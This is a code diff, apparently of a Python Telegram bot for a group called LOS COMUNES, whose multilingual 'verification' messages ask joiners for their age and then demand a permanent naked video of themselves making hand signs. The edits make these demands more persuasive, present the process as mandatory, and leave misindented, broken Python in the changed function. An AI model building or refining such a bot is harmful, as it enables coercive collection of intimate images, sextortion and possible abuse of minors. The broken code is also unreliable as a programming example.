@@ -26,58 +26,70 @@ ADMIN_ID = 8011642705
 TEXTS = {
     "es": {
         "welcome": (
-            "Bienvenido al sistema de verificación de ingreso del grupo LOS COMUNES.\n\n"
-            "Para continuar necesitás:\n"
-            "• Decir tu edad\n"
-            "• Enviar un VIDEO permanente parado DESNUDO haciendo estas señas:\n"
-            "👌🤟"
+            "🔒 Bienvenido al sistema de verificación de LOS COMUNES.\n\n"
+            "Este proceso es obligatorio para ingresar al grupo.\n\n"
+            "Para comenzar, dime tu edad👀"
         ),
-        "ask_age": "Decí tu edad.",
+
         "ask_video": (
-            "Ahora enviá un VIDEO permanente parado DESNUDO haciendo estas señas:\n"
+            "Perfecto.\n\n"
+            "Ahora enviá un VIDEO DESNUDO permanente parado "
+            "haciendo estas señas con las manos:\n"
             "👌🤟"
         ),
+
         "invalid_video": "Tenés que enviar un video válido.",
+
         "sent": "Solicitud enviada para revisión.",
+
         "approved": "Tu solicitud fue aprobada.",
+
         "rejected": "Tu solicitud fue rechazada.",
     },
 
     "en": {
         "welcome": (
-            "Welcome to the LOS COMUNES verification system.\n\n"
-            "To continue you must:\n"
-            "• Tell your age\n"
-            "• Send a permanent NAKED VIDEO standing up doing these hand signs:\n"
-            "👌🤟"
+            "🔒 Welcome to the LOS COMUNES verification system.\n\n"
+            "This process is mandatory to join the group.\n\n"
+            "To begin, tell your age👀"
         ),
-        "ask_age": "Tell your age.",
+
         "ask_video": (
-            "Now send a permanent NAKED VIDEO standing up doing these hand signs:\n"
+            "Perfect.\n\n"
+            "Now send a permanent  NAKED VIDEO standing up "
+            "doing these hand signs:\n"
             "👌🤟"
         ),
+
         "invalid_video": "You must send a valid video.",
+
         "sent": "Request sent for review.",
+
         "approved": "Your request was approved.",
+
         "rejected": "Your request was rejected.",
     },
 
     "pt": {
         "welcome": (
-            "Bem-vindo ao sistema de verificação do grupo LOS COMUNES.\n\n"
-            "Para continuar você precisa:\n"
-            "• Dizer sua idade\n"
-            "• Enviar um VÍDEO permanente em pé NU fazendo estes sinais:\n"
-            "👌🤟"
+            "🔒 Bem-vindo ao sistema de verificação do LOS COMUNES.\n\n"
+            "Este processo é obrigatório para entrar no grupo.\n\n"
+            "Para começar, diga sua idade👀"
         ),
-        "ask_age": "Diga sua idade.",
+
         "ask_video": (
-            "Agora envie um VÍDEO permanente em pé NU fazendo estes sinais:\n"
+            "Perfeito.\n\n"
+            "Agora envie um VÍDEO NU permanente em pé "
+            "fazendo estes sinais:\n"
             "👌🤟"
         ),
+
         "invalid_video": "Você precisa enviar um vídeo válido.",
+
         "sent": "Solicitação enviada para revisão.",
+
         "approved": "Sua solicitação foi aprovada.",
+
         "rejected": "Sua solicitação foi rejeitada.",
     }
 }
@@ -115,14 +127,9 @@ async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "username": user.username or user.first_name,
     }
 
-    await query.message.reply_text(
-        TEXTS[lang]["welcome"]
-    )
-
-    await query.message.reply_text(
-        TEXTS[lang]["ask_age"]
-    )
-
+   await query.message.reply_text(
+    TEXTS[lang]["welcome"]
+)
 
 async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
